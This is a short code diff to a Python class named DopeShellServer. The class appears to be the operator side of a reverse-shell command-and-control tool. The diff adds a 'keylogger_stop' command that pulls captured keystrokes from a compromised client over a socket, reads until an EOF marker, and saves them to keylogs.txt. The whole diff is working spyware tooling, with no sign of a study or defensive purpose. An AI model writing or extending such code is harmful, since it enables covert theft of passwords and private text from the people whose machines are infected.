@@ -125,6 +125,21 @@ class DopeShellServer:
                     else:
                         print(f"[-] Session {new_session_id} does not exist.")
 
+            
+            elif command.lower() == 'keylogger_stop':
+                file_data = b""
+                while True:
+                    chunk = client_socket.recv(4096)
+                    if b'EOF' in chunk:
+                        file_data += chunk[:chunk.index(b'EOF')]
+                        break
+                    file_data += chunk
+
+                with open("keylogs.txt", "wb") as f:
+                    f.write(file_data)
+
+                print("[+] Keylogs received and saved to keylogs.txt.")
+
             elif command.lower().startswith('help'):
                 parts = command.split(maxsplit=1)
                 if len(parts) > 1:
